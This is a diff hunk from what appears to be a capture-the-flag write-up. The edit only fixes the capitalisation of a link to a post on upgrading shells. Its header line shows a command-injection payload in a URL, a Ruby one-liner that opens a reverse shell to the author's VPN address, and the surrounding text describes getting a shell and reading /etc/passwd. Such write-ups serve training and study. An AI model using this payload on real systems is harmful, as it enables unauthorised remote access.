@@ -122,7 +122,7 @@ http://%20`ruby -rsocket -e'spawn("sh",[:in,:out,:err]=>TCPSocket.new("<YOUR VPN
 
 This gives us back a shell on our listener. Running `whoami` tells us that we are currently the "ruby" user.
 
-We'll start by upgrading our shell. Here's a reference link to a post where I describe my methodology for doing this: [Upgrading Shells](/resources/upgrading-shells)
+We'll start by upgrading our shell. Here's a reference link to a post where I describe my methodology for doing this: [Upgrading Shells](/resources/Upgrading-Shells)
 
 Now let's look at the `/etc/passwd` file
 
